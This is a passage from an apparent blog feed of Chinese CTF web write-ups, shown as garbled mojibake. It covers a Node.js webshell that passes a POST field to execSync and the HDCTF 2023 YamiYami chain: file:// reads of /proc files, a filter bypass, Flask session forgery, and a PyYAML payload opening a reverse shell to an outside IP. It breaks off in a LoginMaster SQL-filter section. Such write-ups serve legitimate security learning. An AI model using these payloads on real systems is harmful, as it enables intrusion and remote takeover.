last):</span><br><span class="line">.....</span><br><span class="line">httpx.ReadTimeout: The read operation timed out</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ BASE64WEBSHELL çš„å€¼ä¸º js webshell çš„æ ·æœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">const &#123; execSync &#125; = require(&#x27;child_process&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    // API POST</span><br><span class="line">    async post(request, response) &#123;</span><br><span class="line">        // console.log(request.params)</span><br><span class="line">        artifactPkgName = request.params.artifactPkgName</span><br><span class="line">        // Save Path</span><br><span class="line">        const localDir = __dirname</span><br><span class="line">        // curl command</span><br><span class="line">        const curlCMD = artifactPkgName</span><br><span class="line">        // Create Path</span><br><span class="line">        fs.mkdirSync(localDir, &#123; recursive: true &#125;)</span><br><span class="line">        // download artificate</span><br><span class="line">        ResponseData = execSync(curlCMD, &#123; cwd: localDir &#125;).toString()</span><br><span class="line">        // Response</span><br><span class="line">        response.success(ResponseData)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äº pm2 ä¼šè‡ªåŠ¨æ‰˜ç®¡å’ŒåŠ è½½ api æ–‡ä»¶å¤¹ä¸‹çš„ js æ–‡ä»¶ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—® webshell</p><p>webshell é“¾æ¥åœ°å€ä¸º <a href="https://127.0.0.1/v2/badWebShell">https://127.0.0.1/v2/badWebShell</a> è¯·æ±‚æ–¹å¼ä¸º POST </p><p>POST Form çš„å†…å®¹ä¸º â€˜artifactPkgName={CMD}â€™</p><p>å‚è€ƒ check-shell å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python ./digging-shell.py get_shell https://nodejs-hack.cloud.eson.ninja <span class="built_in">ls</span> <span class="comment"># replace ls as your command. and replace https://nodejs-hack.cloud.eson.ninja as your url and also no / behind.</span></span><br><span class="line">ic| <span class="built_in">command</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">ic| resp.status_code: 200</span><br><span class="line">badWebShell.js</span><br><span class="line">coding</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>æ‹¿åˆ° webshell ä¹‹å cat /flag å³å¯æ‹¿åˆ° flag</p><blockquote><p>flag æ˜¯ mount è¿›å…¥å®¹å™¨è¿›ç¨‹ä¸­çš„ ä¸è¦æ”¾åˆ° /app ç›®å½•ä¸‹å³å¯</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DAS4-ä½ å¬è¯´è¿‡-js-çš„-webshell-å—çš„è§£é¢˜æ€è·¯&quot;&gt;&lt;a href=&quot;#DAS4-ä½ å¬è¯´è¿‡-js-çš„-webshell-å—çš„è§£é¢˜æ€è·¯&quot; class=&quot;headerlink&quot; title=&quot;DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—çš„è§£é¢˜æ€è·¯&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HDCTF-2023-WEB</title>
    <link href="https://ke1nys.github.io/posts/5f20f300.html"/>
    <id>https://ke1nys.github.io/posts/5f20f300.html</id>
    <published>2023-04-23T06:25:11.000Z</published>
    <updated>2023-04-26T13:05:32.226Z</updated>
    
    <content type="html"><![CDATA[<p><strong>è¿™é‡Œçš„è¯æ˜¯åªè®°å½•è‡ªå·±ä¸ä¼šçš„çŸ¥è¯†ç‚¹</strong></p><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="../images/image-20230423142920377.png" alt="image-20230423142920377"></p><p>è¿™æ˜¯ä¸€ä¸ªè€ƒç‚¹ï¼Œè€ƒæŸ¥çš„æ˜¯yaml çš„pythonååºåˆ—åŒ–</p><p><a href="https://xz.aliyun.com/t/7923">å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« æ¥äº†è§£ä¸€ä¸‹YAML</a></p><p><a href="https://xz.aliyun.com/t/11082#toc-11">Pythonååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p><p>è¿™é‡Œçš„è¯å°±æ˜¯ä¸€å…±æœ‰ä¸‰ç§pythonååºåˆ—åŒ–ç±»å‹</p><p><strong>pickle YAML Marshal </strong> </p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p><img src="../images/image-20230423145759804.png" alt="image-20230423145759804"></p><p>è¿™é‡Œçš„è¯æœ‰ä¸‰ä¸ªé€‰é¡¹å¯ä»¥è¿›å»è¿›è¡ŒæŸ¥çœ‹ï¼Œç„¶åç‚¹è¿›Read somethingä¼šå‘ç°ä»–çš„urlæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–çš„</p><p><img src="../images/image-20230423150002768.png" alt="image-20230423150002768"></p><p>äºæ˜¯è¿›è¡Œå°è¯•ï¼Œè¿™é‡Œçš„è¯ç›´æ¥è¯»æ–‡ä»¶çš„æ˜¯è¯»å–ä¸äº†çš„ï¼Œå¾—éœ€è¦ç”¨<code>file</code>ä¼ªåè®®æ¥è¿›è¡Œè¯»å–</p><p><img src="../images/image-20230423150317306.png" alt="image-20230423150317306"></p><p>æˆåŠŸè¿›è¡Œè¯»å–</p><p>ä½†æ˜¯è¿™é‡Œä¸çŸ¥é“flagåç§°ï¼Œæ‰€ä»¥ä¸èƒ½è¿›è¡Œè¯»å–ï¼Œä½†æ˜¯èƒ½å¯ä»¥å°è¯•è¯»å–ä¸€ä¸‹ç¯å¢ƒå˜é‡</p><p><strong>é‚£ä¹ˆè¿™å°±æ˜¯éé¢„æœŸè§£äº†</strong></p><p><img src="../images/image-20230423150830780.png" alt="image-20230423150830780"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node2.anna.nssctf.cn:28523/read?url=file:///../../../../../proc/1/environ</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>/proc/1/environ</code>çš„æ„æ€å°±æ˜¯<strong>è¿›ç¨‹ä¸º1çš„ç¯å¢ƒå˜é‡</strong></p><p><code>/proc/x/envrion</code>è¿™å°±æ˜¯æŸ¥çœ‹ä»»æ„è¿›ç¨‹çš„ç¯å¢ƒå˜é‡çš„æ–¹æ³•</p><p>æŸ¥çœ‹è¿›ç¨‹   <code>ps aux</code></p><p><strong>aï¼šæ˜¾ç¤ºå½“å‰ç»ˆç«¯ä¸‹çš„æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„è¿›ç¨‹ã€‚</strong></p><p><strong>uï¼šä½¿ç”¨ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼è¾“å‡ºè¿›ç¨‹ä¿¡æ¯ã€‚</strong></p><p><strong>xï¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·åœ¨æ‰€æœ‰ç»ˆç«¯ä¸‹çš„è¿›ç¨‹ã€‚</strong></p><p><strong>é¢„æœŸè§£</strong></p><p>â€‹    </p><p><img src="../images/image-20230423151647481.png" alt="image-20230423151647481"></p><p>æŸ¥çœ‹pwdå‘ç°å½“å‰ç›®å½•æ˜¯<code>/app</code>ï¼Œäºæ˜¯å°è¯•ç”¨åˆšæ‰çš„æ–¹æ³•è¿›è¡Œ<code>/app/app.py</code>æºç çš„è¯»å–ï¼Œå› ä¸ºç›´æ¥<code>url/app.py</code>çš„è¯æ˜¯è¯»å–ä¸åˆ°çš„</p><p><img src="../images/image-20230423152137758.png" alt="image-20230423152137758"></p><p>æ­£å¸¸è¯»å–çš„æ—¶å€™å‘ç°æœ‰æ­£åˆ™è¿‡æ»¤ï¼Œäºæ˜¯æŸ¥äº†ä¸€ä¸‹</p><p><a href="https://www.cnblogs.com/xieshengsen/p/6727064.html">[æ­£åˆ™è¡¨è¾¾å¼ re.findall ç”¨æ³•]</a></p><p>é‚£ä¹ˆè¿™é‡Œçš„è¯ä¸æˆåŠŸæ˜¯å› ä¸ºï¼Œè¿™é‡ŒåŒ¹é…åˆ°urlé‡Œçš„<code>app.*</code>ï¼Œç„¶åä»¥app.*çš„æ•°ç»„å½¢å¼è¿”å›ï¼Œç„¶åå¯¼è‡´æŸ¥ä¸åˆ°ç»“æœï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒé‡urlç¼–ç ç»•è¿‡</p><p><img src="../images/image-20230423152629528.png" alt="image-20230423152629528"></p><p>åŒé‡urlç»•è¿‡åæˆåŠŸè¯»å–åˆ°äº†æºç </p><p><strong>æºç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423153527975.png" alt="image-20230423153527975"></p><p>éœ€è¦åšçš„äº‹æƒ…å°±2ä»¶ï¼Œä¼ªé€ Cookieï¼ŒYamlååºåˆ—åŒ–ï¼Œé‚£ä¹ˆCookieæ€ä¹ˆæ‹¿å‘¢ï¼Ÿkeyçš„ç§å­æ˜¯ç”±<code>uuid.getnode()</code>ç”Ÿæˆçš„ï¼Œç½‘ä¸Šæ£€ç´¢ä¸€æ³¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ python ä¸­ä½¿ç”¨ uuid æ¨¡å—ç”Ÿæˆ UUIDï¼ˆé€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼‰ã€‚å¯ä»¥ä½¿ç”¨ uuid.getnode() æ–¹æ³•æ¥è·å–è®¡ç®—æœºçš„ç¡¬ä»¶åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸º UUID çš„ä¸€éƒ¨åˆ†ã€‚</span><br></pre></td></tr></table></figure><p>å› ä¸ºå®¡è®¡æºç å‘ç°ï¼Œåœ¨ä¸Šä¼ å®Œyamlååºåˆ—åŒ–çš„payloadåï¼Œè¿›å…¥boogipopçš„è¿™ä¸ªè·¯ç”±å¾—éœ€è¦<code>seesion</code>çš„å€¼ä¸º<code>Welcome To HDCTF2023</code></p><p><img src="../images/image-20230423153706421.png" alt="image-20230423153706421"></p><p>è¿™é‡Œå°±æ˜¯è€ƒæŸ¥çš„æ˜¯åˆ©ç”¨<strong>uuid</strong>æ¥è¿›è¡Œsessionä¼ªé€ </p><p>ç§å­æ˜¯é€šè¿‡<code>random.seed(uuid.getnode())</code>ç”Ÿæˆçš„ã€‚è€Œuuid.getnode()åˆæ˜¯å°†MACåœ°å€è½¬æ¢ä¸º10è¿›åˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ç¨‹åºä¸­çš„ä»»æ„æ–‡ä»¶è¯»å–æ¥è·å–ç½‘å¡åœ°å€ã€‚ä¸å°±èƒ½å¾—åˆ°ç§å­äº†<br>è¯»å–/proc/net/devå¯ä»¥çŸ¥é“æœåŠ¡å™¨ä¸Šçš„ç½‘å¡ã€‚æ¥ç€/sys/class/net/eth0/addresså¯ä»¥çŸ¥é“MACåœ°å€</p><p><img src="../images/image-20230423155637069.png" alt="image-20230423155637069"></p><p>ç„¶åè¿›è¡Œè¿›åˆ¶è½¬åŒ–</p><p><img src="../images/image-20230423160417630.png" alt="image-20230423160417630"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:45:95</span><br><span class="line">2485376927125</span><br></pre></td></tr></table></figure><p>ç„¶åè·å–å¯†é’¥æ¥è¿›è¡Œsessionä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">52234918416</span>))</span><br><span class="line">SECRET_KEY = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423160653384.png" alt="image-20230423160653384"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">231.28194338656192</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿ç€å¯†é’¥å»è¿›è¡Œsessionä¼ªé€ </p><p><a href="https://github.com/noraj/flask-session-cookie-manager">sessionä¼ªé€ å·¥å…·</a></p><p><img src="../images/image-20230423161334979.png" alt="image-20230423161334979"></p><p>ç„¶åæ ¹æ®æºç è¿›è¡Œä¿®æ”¹passportä¸º<code>Welcome To HDCTF2023</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œç¼–ç </p><p><img src="../images/image-20230423161614597.png" alt="image-20230423161614597"></p><p>ä¼ªé€ æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZETpRg.LJFqsGZPtbnl8N6Ngul7lMTWXgU</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆè¿›è¡Œpaylaodçš„æ–‡ä»¶ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">str</span></span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/<span class="built_in">tuple</span></span><br><span class="line">      - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/6666 &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      - !!python/<span class="built_in">object</span>/new:<span class="built_in">staticmethod</span></span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:<span class="built_in">eval</span></span><br><span class="line">          items: !!python/name:<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">å…³äºyamlååºåˆ—åŒ–çš„payload</a></p><p>è¿˜æœ‰å¾ˆå¤šè¯¦ç»†çš„è§£é‡Šéƒ½åœ¨é‡Œé¢</p><p>ç„¶åå°±èƒ½æˆåŠŸå¼¹åˆ°shelläº†</p><p><strong>æ€»ç»“</strong></p><p>file://ä¼ªåè®®è¯»å–æºç </p><p>/proc/1/environ ç¯å¢ƒå˜é‡è¯»å–</p><p>æ­£åˆ™è¡¨è¾¾å¼ re.findall ç”¨æ³•  ä¸¤æ¬¡urlç¼–ç ç»•è¿‡</p><p>uuidè¿›è¡Œsessionä¼ªé€ </p><p>YAMLååºåˆ—åŒ–</p><h2 id="HDCTF-2023-LoginMaster-quineæ³¨å…¥"><a href="#HDCTF-2023-LoginMaster-quineæ³¨å…¥" class="headerlink" title="[HDCTF 2023]LoginMaster(quineæ³¨å…¥)"></a>[HDCTF 2023]LoginMaster(quineæ³¨å…¥)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230424100905511.png" alt="image-20230424100905511"></p><p>è¿™é‡Œçš„è¯å…ˆå»äº†è§£ä¸€ä¸‹uniqueæ³¨å…¥æ˜¯å•¥ä¸œè¥¿</p><p><a href="https://nosec.org/home/detail/2395.html">è¯¦è§£Laravel 5.8 SQLæ³¨å…¥æ¼æ´(uniqueæ³¨å…¥)</a></p><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p><strong>è¯¥æ¼æ´å­˜åœ¨äºLaravelçš„è¡¨å•éªŒè¯åŠŸèƒ½ï¼Œæ¼æ´å‡½æ•°ä¸ºignore()ï¼Œæ¼æ´æ–‡ä»¶ä½äº/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.phpã€‚æœ‰æ—¶å€™å¼€å‘è€…å¸Œæœ›åœ¨è¿›è¡Œå­—æ®µå”¯ä¸€æ€§éªŒè¯æ—¶å¿½ç•¥æŒ‡å®šå­—æ®µä»¥åŠå­—æ®µå€¼ï¼Œé€šå¸¸ä¼šè°ƒç”¨Ruleç±»çš„ignoreæ–¹æ³•ã€‚è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå­—æ®µå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå­—æ®µåï¼Œå½“å­—æ®µåä¸ºç©ºæ—¶ï¼Œé»˜è®¤å­—æ®µåä¸ºâ€œidâ€ã€‚å¦‚æœç”¨æˆ·å¯ä»¥æ§åˆ¶ignore()æ–¹æ³•çš„å‚æ•°å€¼ï¼Œå°±ä¼šäº§ç”ŸSQLæ³¨å…¥æ¼æ´ã€‚</strong></p><p>è¿™é‡Œçš„è¯å°±æ‰«ä¸€ä¸‹ç›®å½•å‘ç°å­˜åœ¨robots.txtæ–‡ä»¶ï¼Œç„¶åè¿›è¡Œè¯»å–ï¼Œå‘ç°å­˜åœ¨wafæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠè¿™æ®µä»£ç åˆ°googleä¸€æœç´¢ï¼Œå°±èƒ½æ‰¾åˆ°åŸé¢˜äº†(<strong>æ‰“äº†è¿™ä¹ˆå¤šæ¯”èµ› ï¼Œç­‰èµ›åçœ‹wpå¤ç°çš„æ—¶å€™æ‰å‘ç°åŸåŸæ¥å¥½å¤šä¸œè¥¿éƒ½æ˜¯å¯ä»¥æœå‡ºæ¥ï¼Œåªæ˜¯è‡ªå·±æœçš„ä¸è¿‡å‡†ç¡®</strong>)</p><p><strong>æœç„¶ æœç´¢ä¹Ÿæ˜¯ä¸€é—¨å­¦é—®</strong></p><p><a 